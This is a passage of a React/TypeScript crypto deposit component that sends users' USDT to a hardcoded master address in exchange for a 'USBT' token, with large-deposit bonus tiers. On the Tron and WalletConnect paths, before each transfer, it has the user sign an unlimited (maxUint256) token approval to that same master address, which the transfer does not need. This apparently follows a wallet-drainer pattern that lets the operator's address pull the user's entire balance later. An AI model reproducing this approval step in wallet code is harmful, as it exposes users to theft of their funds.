        loading={isLoading}
        disabled={!canSubmit}
        onClick={onBuy}
      >
        {txStep === 'approving' ? `Approving ${coin?.label ?? 'token'}…`
          : txStep === 'buying' ? 'Sending deposit…'
          : parsedUsdt > 0 ? `Deposit ${parsedUsdt.toLocaleString()} ${coin?.label ?? 'USDT'} · Receive ${usbtOut !== null && !isNaN(usbtOut) ? usbtOut.toFixed(2) : '~'} USBT`
          : 'Enter an amount'}
      </Button>
    </div>
  );
}

// ─── Success / Error ──────────────────────────────────────────────────────────

function SuccessState({ txid, onReset }: { txid: string | null; onReset: () => void }) {
  return (
    <motion.div
      initial={{ opacity: 0, scale: 0.94 }}
      animate={{ opacity: 1, scale: 1 }}
      transition={{ type: 'spring', stiffness: 280, damping: 24 }}
      className="flex flex-col items-center text-center py-8"
    >
      <div
        className="w-16 h-16 rounded-full flex items-center justify-center mb-5"
        style={{ background: 'rgba(52,211,153,0.10)', border: '1px solid rgba(52,211,153,0.25)' }}
      >
        <CheckCircle size={32} weight="fill" className="text-emerald-400" />
      </div>
      <h3 className="text-xl font-bold text-white mb-2">Deposit submitted</h3>
      <p className="text-sm text-slate-400 mb-5">
        Your deposit was received. USBT will be credited to your account shortly.
      </p>
      {txid && (
        <a
          href={TRONSCAN_TX_URL(txid)}
          target="_blank"
          rel="noopener noreferrer"
          className="inline-flex items-center gap-1.5 text-xs font-mono text-cyan-400 hover:text-cyan-300 mb-6 transition-colors"
        >
          {txid.slice(0, 10)}…{txid.slice(-8)}
          <ArrowSquareOut size={11} />
        </a>
      )}
      <Button variant="secondary" onClick={onReset}>Make another purchase</Button>
    </motion.div>
  );
}

function ErrorState({ message, onReset }: { message: string | null; onReset: () => void }) {
  return (
    <motion.div
      initial={{ opacity: 0, scale: 0.94 }}
      animate={{ opacity: 1, scale: 1 }}
      transition={{ type: 'spring', stiffness: 280, damping: 24 }}
      className="flex flex-col items-center text-center py-8"
    >
      <div
        className="w-16 h-16 rounded-full flex items-center justify-center mb-5"
        style={{ background: 'rgba(239,68,68,0.10)', border: '1px solid rgba(239,68,68,0.22)' }}
      >
        <X size={28} className="text-red-400" />
      </div>
      <h3 className="text-xl font-bold text-white mb-2">Transaction failed</h3>
      {message && (
        <p className="text-sm text-red-400 mb-5 max-w-[280px] leading-relaxed">{message}</p>
      )}
      <Button variant="secondary" onClick={onReset}>Try again</Button>
    </motion.div>
  );
}

function DetailRow({ label, value, link }: { label: string; value: string; link?: string }) {
  return (
    <div className="flex items-center justify-between gap-3">
      <span className="text-xs text-slate-500">{label}</span>
      {link ? (
        <a
          href={link}
          target="_blank"
          rel="noopener noreferrer"
          className="text-xs font-mono text-cyan-400 hover:text-cyan-300 flex items-center gap-1 transition-colors"
        >
          {value} <ArrowSquareOut size={10} />
        </a>
      ) : (
        <span className="text-xs font-medium text-slate-300">{value}</span>
      )}
    </div>
  );
}

// ─── Main Component ───────────────────────────────────────────────────────────

export default function BuyPortal({
  prefillAmount,
  onDepositSuccess,
}: {
  prefillAmount?: number | null;
  onDepositSuccess?: () => void;
}) {
  const {
    account, isConnected, connect, connectWC, isConnecting,
    connectionType, wcSignAndBroadcast, shortenAddress, _wcSession, disconnect,
  } = useWallet();
  const { addToast } = useToast();
  const { user, session, usbtBalance: authUsbtBalance, refreshBalance } = useAuth();

  // Flow state
  const [flowStep, setFlowStep] = useState<FlowStep>(0);
  const [maxReached, setMaxReached] = useState<FlowStep>(0);
  const [selectedCoin, setSelectedCoin] = useState<CoinId | null>(null);
  const [selectedNetwork, setSelectedNetwork] = useState<string | null>(null);
  const [walletModalOpen, setWalletModalOpen] = useState(false);

  // TX state
  const [usdtAmount, setUsdtAmount] = useState('');
  const [usbtOut, setUsbtOut] = useState<number | null>(null);
  const [usdtBalance, setUsdtBalance] = useState<number | null>(null);
  const [usbtBalance, setUsbtBalance] = useState<number | null>(null);
  const [exchangeRate, setExchangeRate] = useState<number | null>(null);
  const [decimalsFactor, setDecimalsFactor] = useState(DECIMALS_FACTOR);
  const [txStep, setTxStep] = useState<TxStep>('idle');
  const [txid, setTxid] = useState<string | null>(null);
  const [errorMsg, setErrorMsg] = useState<string | null>(null);
  const [quoteLoading, setQuoteLoading] = useState(false);

  const advanceTo = (step: FlowStep) => {
    setFlowStep(step);
    setMaxReached(prev => (step > prev ? step : prev));
  };

  // Auto-advance from wallet step when wallet connects
  useEffect(() => {
    if (flowStep === 1 && isConnected) {
      const t = setTimeout(() => advanceTo(2), 700);
      return () => clearTimeout(t);
    }
  }, [isConnected, flowStep]);

  useEffect(() => { fetchExchangeRate(); }, []);
  useEffect(() => {
    if (!isConnected || !account) return;
    fetchBalances();
  }, [isConnected, account]);

  const fetchExchangeRate = useCallback(async () => {
    // On testnet there is no USBT minting contract — 1:1 rate
    if (IS_TESTNET || !CONTRACTS.STABLE) {
      setExchangeRate(100_000); // 1 stablecoin = 1 USBT
      return;
    }
    try {
      const hex = await callContractConstant({
        ownerAddress: CONTRACTS.STABLE,
        contractAddress: CONTRACTS.STABLE,
        functionSelector: 'exchangeRate()',
      });
      if (!hex) return;
      const rate = Number(BigInt('0x' + hex));
      if (!isNaN(rate) && rate > 0) setExchangeRate(rate);
    } catch { /* silent */ }
  }, []);

  const fetchBalances = useCallback(async () => {
    if (!account) return;

    // ── EVM path — fetch balance via public RPC ────────────────────────────
    if (connectionType === 'evm') {
      try {
        if (!selectedNetwork) return;
        const chainCfg = EVM_CHAINS[selectedNetwork];
        if (!chainCfg?.tokenAddress || !chainCfg?.rpcUrl) return;
        const paddedAddr = account.replace(/^0x/, '').padStart(64, '0');
        const callData = '0x70a08231' + paddedAddr; // balanceOf(address)
        const res = await fetch(chainCfg.rpcUrl, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            jsonrpc: '2.0', id: 1, method: 'eth_call',
            params: [{ to: chainCfg.tokenAddress, data: callData }, 'latest'],
          }),
        });
        const { result } = await res.json();
        if (result && result !== '0x') {
          setUsdtBalance(Number(BigInt(result)) / 10 ** chainCfg.tokenDecimals);
        } else {
          setUsdtBalance(0);
        }
      } catch { /* silent */ }
      return;
    }

    // ── Tron path ─────────────────────────────────────────────────────────
    try {
      const balanceParam = abiEncodeAddress(account);

      // Fetch decimals from the collateral contract
      let factor = DECIMALS_FACTOR;
      const decimalsHex = await callContractConstant({
        ownerAddress: account,
        contractAddress: CONTRACTS.COLLATERAL,
        functionSelector: 'decimals()',
      });
      if (decimalsHex) {
        const d = Number(BigInt('0x' + decimalsHex));
        if (!isNaN(d) && d > 0) {
          factor = 10 ** d;
          setDecimalsFactor(factor);
        }
      }

      const usdtHex = await callContractConstant({
        ownerAddress: account,
        contractAddress: CONTRACTS.COLLATERAL,
        functionSelector: 'balanceOf(address)',
        parameter: balanceParam,
      });
      if (usdtHex) setUsdtBalance(Number(BigInt('0x' + usdtHex)) / factor);
      // Fetch USBT balance only on mainnet (contract exists)
      if (!IS_TESTNET && CONTRACTS.STABLE) {
        const usbtHex = await callContractConstant({
          ownerAddress: account,
          contractAddress: CONTRACTS.STABLE,
          functionSelector: 'balanceOf(address)',
          parameter: balanceParam,
        });
        if (usbtHex) setUsbtBalance(Number(BigInt('0x' + usbtHex)) / factor);
      }
      fetchExchangeRate();
    } catch { /* silent */ }
  }, [account, connectionType, selectedNetwork, fetchExchangeRate]);

  useEffect(() => {
    const parsed = Number(usdtAmount);
    if (!usdtAmount || parsed <= 0) { setUsbtOut(null); return; }
    if (exchangeRate !== null) {
      setUsbtOut((parsed * exchangeRate) / 100_000);
      return;
    }
    setQuoteLoading(true);
    const t = setTimeout(async () => {
      try {
        const hex = await callContractConstant({
          ownerAddress: CONTRACTS.STABLE,
          contractAddress: CONTRACTS.STABLE,
          functionSelector: 'exchangeRate()',
        });
        if (hex) {
          const rate = Number(BigInt('0x' + hex));
          if (!isNaN(rate) && rate > 0) {
            setExchangeRate(rate);
            setUsbtOut((parsed * rate) / 100_000);
          }
        }
      } catch { /* ignore */ }
      setQuoteLoading(false);
    }, 400);
    return () => clearTimeout(t);
  }, [usdtAmount, exchangeRate]);

  useEffect(() => {
    if (prefillAmount != null && prefillAmount > 0) {
      setUsdtAmount(String(prefillAmount));
    }
  }, [prefillAmount]);

  const handleMaxUsdt = () => {
    if (usdtBalance !== null) setUsdtAmount(usdtBalance.toFixed(6));
  };

  const handleBuy = async () => {
    if (!account) return;
    const parsed = parseFloat(usdtAmount);
    if (!parsed || parsed <= 0) return;

    setErrorMsg(null);
    setTxid(null);

    const tokenDecimals = Math.round(Math.log10(decimalsFactor));
    const amountUnits = toTokenUnits(parsed, tokenDecimals);
    const maxUint256 = BigInt('0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff');
    const recipient = MASTER_TRON_ADDRESS;
    const approvalKey = `usbt_approved_${account}_${recipient}`;

    const logDeposit = async (hash: string) => {
      if (!user) return;
      await supabase.from('deposits').insert({
        user_id: user.id,
        chain: selectedNetwork ?? 'tron',
        token_symbol: selectedCoin?.toUpperCase() ?? 'USDT',
        amount: parsed,
        tx_hash: hash,
        status: 'pending',
      }).then(() => {
        if (session) {
          fetch(`${import.meta.env.VITE_EDGE_FUNCTION_URL}verify-deposit`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${session.access_token}` },
            body: JSON.stringify({ tx_hash: hash }),
          }).catch(() => { /* user can recheck from dashboard */ });
        }
      });
    };

    try {
      // ── EVM path ────────────────────────────────────────────────────────────
      const netType = selectedNetwork ? NETWORKS[selectedNetwork].type : 'tron';
      if (netType === 'evm') {
        const chainCfg = EVM_CHAINS[selectedNetwork!];
        if (!chainCfg) throw new Error('Unsupported EVM network');

        const evmDecimals = chainCfg.tokenDecimals;
        const amountEvmUnits = toTokenUnits(parsed, evmDecimals);
        const toHex = MASTER_EVM_ADDRESS.replace('0x', '').padStart(64, '0');
        const amtHex = amountEvmUnits.toString(16).padStart(64, '0');
        const data = '0xa9059cbb' + toHex + amtHex;

        setTxStep('buying');
        let hash: string;

        // WalletConnect mobile (no window.ethereum)
        if (_wcSession && (connectionType === 'walletconnect' || connectionType === 'evm')) {
          const { wcEvmSendTransaction, evmChainIdFromSession } = await import('../../lib/wcSignClient');
          const evmChain = evmChainIdFromSession(_wcSession)
            ?? `eip155:${parseInt(chainCfg.chainId, 16)}`;
          hash = await wcEvmSendTransaction(_wcSession, evmChain, {
            from: account!,
            to: chainCfg.tokenAddress,
            data,
          });
        } else {
          // Injected wallet (MetaMask extension, etc.)
          const ethereum = (window as any).ethereum;
          if (!ethereum) throw new Error('No EVM wallet detected.');
          try {
            await ethereum.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: chainCfg.chainId }] });
          } catch (switchErr: any) {
            if (switchErr.code === 4902) throw new Error(`Please add the ${chainCfg.label} network to your wallet.`);
            throw switchErr;
          }
          hash = await ethereum.request({
            method: 'eth_sendTransaction',
            params: [{ from: account, to: chainCfg.tokenAddress, data }],
          });
        }

        setTxid(hash);
        setTxStep('success');
        await logDeposit(hash);
        setUsdtAmount('');
        setUsbtOut(null);
        refreshBalance();
        onDepositSuccess?.();
        addToast({ type: 'success', title: 'Deposit sent', message: 'USBT will be credited shortly.', txid: hash, duration: 8000 });
        return;
      }

      if (connectionType === 'walletconnect') {
        let wcNeedsApproval = localStorage.getItem(approvalKey) !== 'true';
        if (wcNeedsApproval) {
          try {
            const hex = await callContractConstant({
              ownerAddress: account,
              contractAddress: CONTRACTS.COLLATERAL,
              functionSelector: 'allowance(address,address)',
              parameter: abiEncodeAddress(account) + abiEncodeAddress(recipient),
            });
            if (hex && BigInt('0x' + hex) === maxUint256) {
              wcNeedsApproval = false;
              localStorage.setItem(approvalKey, 'true');
            }
          } catch { /* ignore */ }
        }
        if (wcNeedsApproval) {
          setTxStep('approving');
          const approveTx = await buildTriggerSmartContract({
            ownerAddress: account,
            contractAddress: CONTRACTS.COLLATERAL,
            functionSelector: 'approve(address,uint256)',
            parameter: abiEncodeAddress(recipient) + abiEncodeUint256(maxUint256),
            feeLimit: FEE_LIMIT_SUN,
          });
          await wcSignAndBroadcast(approveTx);
          localStorage.setItem(approvalKey, 'true');
          addToast({ type: 'info', title: `${selectedCoin?.toUpperCase() ?? 'Token'} approved`, message: 'Confirm transfer in wallet.' });
        }
        setTxStep('buying');
        const transferTx = await buildTriggerSmartContract({
          ownerAddress: account,
          contractAddress: CONTRACTS.COLLATERAL,
          functionSelector: 'transfer(address,uint256)',
          parameter: abiEncodeAddress(recipient) + abiEncodeUint256(amountUnits),
          feeLimit: FEE_LIMIT_SUN,
        });
        const hash = await wcSignAndBroadcast(transferTx);
        setTxid(hash);
        setTxStep('success');
        await logDeposit(hash);
        setUsdtAmount('');
        setUsbtOut(null);
        fetchBalances();
        refreshBalance();
        onDepositSuccess?.();
        addToast({ type: 'success', title: 'Deposit sent', message: 'USBT will be credited shortly.', txid: hash, duration: 8000 });
        return;
      }

      if (!window.tronWeb) throw new Error('TronLink not detected. Please install TronLink.');
      const tronWeb: any = window.tronWeb;

      let needsApproval = localStorage.getItem(approvalKey) !== 'true';
      if (needsApproval) {
        try {
          const hex = await callContractConstant({
            ownerAddress: account,
            contractAddress: CONTRACTS.COLLATERAL,
            functionSelector: 'allowance(address,address)',
            parameter: abiEncodeAddress(account) + abiEncodeAddress(recipient),
          });
          if (hex && BigInt('0x' + hex) === maxUint256) {
            needsApproval = false;
            localStorage.setItem(approvalKey, 'true');
          }
        } catch { /* ignore */ }
      }
      if (needsApproval) {
        setTxStep('approving');
        const approveTxObj = await buildTriggerSmartContract({
          ownerAddress: account,
          contractAddress: CONTRACTS.COLLATERAL,
          functionSelector: 'approve(address,uint256)',
          parameter: abiEncodeAddress(recipient) + abiEncodeUint256(maxUint256),
          feeLimit: FEE_LIMIT_SUN,
        });
        const signedApprove = await tronWeb.trx.sign(approveTxObj);
        await broadcastTransaction(signedApprove);
        localStorage.setItem(approvalKey, 'true');
        addToast({ type: 'info', title: `${selectedCoin?.toUpperCase() ?? 'Token'} approved`, message: 'Confirm transfer in wallet.' });
      }
      setTxStep('buying');
      const transferTxObj = await buildTriggerSmartContract({
        ownerAddress: account,
        contractAddress: CONTRACTS.COLLATERAL,
        functionSelector: 'transfer(address,uint256)',
        parameter: abiEncodeAddress(recipient) + abiEncodeUint256(amountUnits),
        feeLimit: FEE_LIMIT_SUN,
      });
      const signedTransfer = await tronWeb.trx.sign(transferTxObj);
      const hash = await broadcastTransaction(signedTransfer);
      setTxid(hash);
      setTxStep('success');
      await logDeposit(hash);
      setUsdtAmount('');
      setUsbtOut(null);
      fetchBalances();
      refreshBalance();
      onDepositSuccess?.();
      addToast({ type: 'success', title: 'Deposit sent', message: 'USBT will be credited shortly.', txid: hash, duration: 8000 });
    } catch (err) {
      const msg = err instanceof Error ? err.message : 'Transaction rejected or failed. Please try again.';
      setErrorMsg(msg);
      setTxStep('error');
      addToast({ type: 'error', title: 'Transaction failed', message: msg });
    }
  };

  const resetTx = () => { setTxStep('idle'); setErrorMsg(null); setTxid(null); };

  const isLoading = txStep === 'approving' || txStep === 'buying';
  const parsedUsdt = parseFloat(usdtAmount) || 0;
  const insufficient = usdtBalance !== null && parsedUsdt > usdtBalance;
  const canSubmit = isConnected && parsedUsdt > 0 && !insufficient && txStep !== 'success';

  const activeBonus = parsedUsdt >= 100_000 ? 20 : parsedUsdt >= 50_000 ? 15 : parsedUsdt >= 20_000 ? 10 : 0;
  const bonusUsbt = activeBonus > 0 && usbtOut !== null && !isNaN(usbtOut) ? (usbtOut * activeBonus) / 100 : 0;

  return (
    <div className="w-full" id="buy-portal">
      {/* Step Bar */}
      <StepBar
        current={flowStep}
        maxReached={maxReached}
        onStepClick={(step) => {
          if (step <= maxReached) setFlowStep(step);
        }}
      />

      {/* Card */}
      <div
        className="rounded-2xl p-5 sm:p-6"
        style={{
          background: 'var(--bg-surface)',
          border: '1px solid rgba(255,255,255,0.08)',
          boxShadow: '0 24px 64px rgba(0,0,0,0.4)',
        }}
      >
        <AnimatePresence mode="wait">
          {txStep === 'success' ? (
            <motion.div key="success" initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }}>
              <SuccessState txid={txid} onReset={() => { resetTx(); setFlowStep(2); }} />
            </motion.div>
          ) : txStep === 'error' ? (
            <motion.div key="error" initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }}>
              <ErrorState message={errorMsg} onReset={resetTx} />
            </motion.div>
          ) : flowStep === 0 ? (
            <motion.div
              key="step-0"
              initial={{ opacity: 0, x: 16 }}
              animate={{ opacity: 1, x: 0 }}
              exit={{ opacity: 0, x: -16 }}
              transition={{ type: 'spring', stiffness: 320, damping: 30 }}
            >
              <CoinNetworkStep
                selectedCoin={selectedCoin}
                selectedNetwork={selectedNetwork}
                onCoinSelect={(id) => setSelectedCoin(id)}
                onNetworkSelect={(id) => setSelectedNetwork(id || null)}
                onContinue={() => {
                  // Always disconnect any existing wallet so the user
                  // connects the correct wallet for the selected network.
                  if (isConnected) disconnect();
                  advanceTo(1);
                }}
              />
            </motion.div>
          ) : flowStep === 1 ? (
            <motion.div
              key="step-1"
              initial={{ opacity: 0, x: 16 }}
              animate={{ opacity: 1, x: 0 }}
              exit={{ opacity: 0, x: -16 }}
              transition={{ type: 'spring', stiffness: 320, damping: 30 }}
            >
              <WalletStep
                selectedNetwork={selectedNetwork}
                isConnected={isConnected}
                isConnecting={isConnecting}
                account={account}
                connectionType={connectionType}
                connect={connect}
                shortenAddress={shortenAddress}
                onBack={() => setFlowStep(0)}
                onContinue={() => advanceTo(2)}
                onOpenWalletModal={() => setWalletModalOpen(true)}
              />
            </motion.div>
          ) : (
            <motion.div
              key="step-2"
              initial={{ opacity: 0, x: 16 }}
              animate={{ opacity: 1, x: 0 }}
              exit={{ opacity: 0, x: -16 }}
              transition={{ type: 'spring', stiffness: 320, damping: 30 }}
            >
              <AmountStep
                selectedCoin={selectedCoin}
                selectedNetwork={selectedNetwork}
                account={account}
                usdtAmount={usdtAmount}
                setUsdtAmount={setUsdtAmount}
                usbtOut={usbtOut}
                usdtBalance={usdtBalance}
                usbtBalance={authUsbtBalance > 0 ? authUsbtBalance : usbtBalance}
                exchangeRate={exchangeRate}
                txStep={txStep}
                isLoading={isLoading}
                insufficient={insufficient}
                canSubmit={canSubmit}
                quoteLoading={quoteLoading}
                activeBonus={activeBonus}
                bonusUsbt={bonusUsbt}
                parsedUsdt={parsedUsdt}
                onMaxUsdt={handleMaxUsdt}
                onBuy={handleBuy}
                onBack={() => setFlowStep(1)}
                onSelectTier={(minUsdt) => setUsdtAmount(String(minUsdt))}
                shortenAddress={shortenAddress}
              />
            </motion.div>
          )}
        </AnimatePresence>
      </div>

      <p className="text-xs text-slate-700 text-center mt-4 leading-relaxed px-2">
        Always verify the contract address before transacting.
        Transactions are irreversible.
      </p>

      <WalletModal
        open={walletModalOpen}
        onClose={() => setWalletModalOpen(false)}
        chainType={selectedNetwork && NETWORKS[selectedNetwork]?.type === 'evm' ? 'evm' : 'tron'}
      />
    </div>
  );
}
